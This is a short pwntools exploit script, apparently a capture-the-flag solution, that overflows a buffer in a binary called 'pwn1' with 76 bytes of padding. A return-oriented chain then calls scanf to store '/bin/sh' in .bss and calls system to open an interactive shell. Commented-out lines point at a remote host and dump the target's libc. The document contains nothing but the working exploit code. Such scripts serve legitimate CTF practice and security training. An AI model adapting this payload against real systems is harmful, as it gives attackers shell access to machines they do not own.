from pwn import *

context.log_level = 'debug'
io = process('./pwn1')
#io = remote('106.75.18.19', 16787)
e = ELF('./pwn1')
io.recvuntil('!')


ret = 0x8048366
popret = 0x804837d
pop2ret = 0x80485ae
pop3ret = 0x80485ad
pop4ret = 0x80485ac
leaveret = 0x8048458
addesp_12 = 0x804837a
addesp_44 = 0x80485a9

_s = 0x080485ED

payload = 'A'*76 + p32(e.plt['__isoc99_scanf']) + p32(pop2ret) + p32(_s) + p32(e.bss())
payload += p32(e.plt['system']) + 'A'*4 + p32(e.bss())
io.sendline(payload)
io.sendline('/bin/sh')
io.recv()
#io.sendline('cat /lib/libc.so.6')
#buf = io.recvall()
#open('libc.so','wb').write(buf)
io.interactive()